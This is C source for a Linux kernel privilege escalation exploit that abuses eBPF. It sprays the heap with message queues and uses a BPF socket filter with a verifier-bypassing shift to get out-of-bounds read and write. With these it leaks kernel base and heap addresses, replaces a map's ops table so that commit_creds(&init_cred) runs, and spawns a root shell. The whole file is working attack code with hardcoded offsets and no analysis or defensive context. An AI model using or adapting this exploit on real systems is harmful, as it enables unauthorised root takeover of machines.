#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/types.h>
#include <sys/msg.h>
#include "bpf.h"

char buffer[64];
int sockets[2];
int ctrl_mapfd;
int vuln_mapfd;
size_t ctrlmap_ptr;
size_t vulnmap_ptr;
size_t leakbuf[0x100];
size_t ctrlbuf[0x100];
size_t kbase;
size_t pivot_esp;

struct message {
    long type;
    char text[0x800];
} msg;

void msg_alloc(int id, int size)
{
  if (msgsnd(id, (void *)&msg, size - 0x30, IPC_NOWAIT) < 0) {
    perror(strerror(errno));
    exit(1);
  }
}

void heap_spray()
{
  int msqid;
  msg.type = 1;

  if ((msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT)) < 0) {
    perror(strerror(errno));
    exit(1);
  }

  for (int i = 0; i < 0x13; ++i) {
    msg_alloc(msqid, 0x200);
  }
}

void get_shell() {
  printf("[*] get shell\n");
  system("sh");
}

void update_elem_ctrl()
{
  int key = 0;
  if (bpf_update_elem(ctrl_mapfd, &key, ctrlbuf, 0)) {
    printf("bpf_update_elem failed '%s'\n", strerror(errno));
  }
}

void get_elem_ctrl()
{
  int key = 0;
  if (bpf_lookup_elem(ctrl_mapfd, &key, leakbuf)) {
    printf("bpf_lookup_elem failed '%s'\n", strerror(errno));
  }
}

void debugmsg(void)
{
  char buffer[64];
  ssize_t n = write(sockets[0], buffer, sizeof(buffer));

  if (n < 0) {
    perror("write");
    return;
  }
  if (n != sizeof(buffer))
    fprintf(stderr, "short write: %lu\n", n);
}

int load_prog()
{
  // make bpf_map alloc to new page, in order to leak heap pointer stablly
  heap_spray();

  // size == 0x100, useful to set data on bpfarray
  ctrl_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x100, 1, 0);
  if (ctrl_mapfd < 0) {
    puts("failed to create map1");
    return -1;
  }

  // size*count should be the same as ctrl_map
  vuln_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x100, 1, 0);
  if (vuln_mapfd < 0) {
    puts("failed to create map2");
    return -1;
  }

  // sizeof(struct bpf_array) == 0x200
  // offset of bpf_array.value == 0x90
  struct bpf_insn prog[] = {
    // DW == 8bytes
    BPF_GET_MAP(ctrl_mapfd, 0),
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 8),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 0x10),
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

    BPF_ST_MEM(BPF_W, BPF_REG_0, 0, 0x41414141),
    BPF_ST_MEM(BPF_W, BPF_REG_0, 4, 0x41414141),

    BPF_JMP_IMM(BPF_JGE, BPF_REG_8, 0, 1),
    BPF_JMP_IMM(BPF_JA, 0, 0, 9), // goto exit
    BPF_JMP_IMM(BPF_JGE, BPF_REG_8, 0x1000, 8),

    BPF_JMP_IMM(BPF_JGE, BPF_REG_9, 0, 1),
    BPF_JMP_IMM(BPF_JA, 0, 0, 6), // goto exit
    BPF_JMP_IMM(BPF_JGE, BPF_REG_9, 0x400, 5),

    BPF_ALU64_REG(BPF_RSH, BPF_REG_8, BPF_REG_9), // r8 >>= r9
    BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_8), // r0 += r8

    // switch leak / write
    BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 4),

    // leak
    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_0, 0), // r4 = *r0
    BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_4, 0x10), // *r6 = r4
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),

    // write
    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, 0), // *r0 = r6
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
  };
  return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
}

void infoleak()
{
  update_elem_ctrl();
  debugmsg();
  get_elem_ctrl();
  debugmsg();
}

void overwrite_array_ops() {
  int n = 0;
  int key = 0;
  size_t init_cred = kbase + 0xe43e60;
  size_t fd_array_map_delete_elem = kbase + 0x12b730;
  size_t commit_creds = kbase + 0x81e70;

  // prepare fake array_ops
  ctrlbuf[n++] = 0x170 * 2; // offset to bpf_array->map->ops
  ctrlbuf[n++] = 1;
  ctrlbuf[n++] = ctrlmap_ptr + 0x90 + 0x18; // ebpf code will overwrite bpf_array->map->ops with this ptr

  ctrlbuf[n++] = 0x4141414141414141;        // point to here
  ctrlbuf[n++] = 0x4241414141414141;
  ctrlbuf[n++] = 0x4341414141414141;
  ctrlbuf[n++] = 0x4441414141414141;
  ctrlbuf[n++] = 0x4541414141414141;
  ctrlbuf[n++] = 0x4641414141414141;
  ctrlbuf[n++] = fd_array_map_delete_elem;  // map_delete_elem
  ctrlbuf[n++] = 0x4841414141414141;
  ctrlbuf[n++] = commit_creds;              // map_fd_put_ptr

  // put elem on vuln_map
  bpf_update_elem(vuln_mapfd, &key, &init_cred, 0);
  debugmsg();

  // overwrite vulnmap->ops
  update_elem_ctrl();
  debugmsg();

  // fd_array_map_delete_elem call map->map_fd_put_ptr(first_elem) = commit_creds(&init_cred)
  bpf_delete_elem(vuln_mapfd, &key);
  debugmsg();

  get_shell();
}

int main() {
  int progfd = load_prog();

  if (progfd < 0) {
    printf("log:\n%s", bpf_log_buf);
    if (errno == EACCES)
      printf("failed to load prog '%s'\n", strerror(errno));
  }

  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) {
    strerror(errno);
    return 0;
  }

  if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0) {
    strerror(errno);
    return 0;
  }

  ctrlbuf[0] = 0x170 * 2;
  ctrlbuf[1] = 1;
  infoleak();

  kbase = leakbuf[2] - 0xa12100;
  pivot_esp = kbase + 0x6ec938;
  printf("[+] leak kernel kbase: 0x%lx\n", kbase);

  ctrlbuf[0] = 0x570 * 2;
  ctrlbuf[1] = 1;
  infoleak();

  ctrlmap_ptr = leakbuf[2] - 0x800;
  vulnmap_ptr = ctrlmap_ptr + 0x200;
  printf("[+] leak kernel heap: 0x%lx\n", ctrlmap_ptr);

  overwrite_array_ops();
}
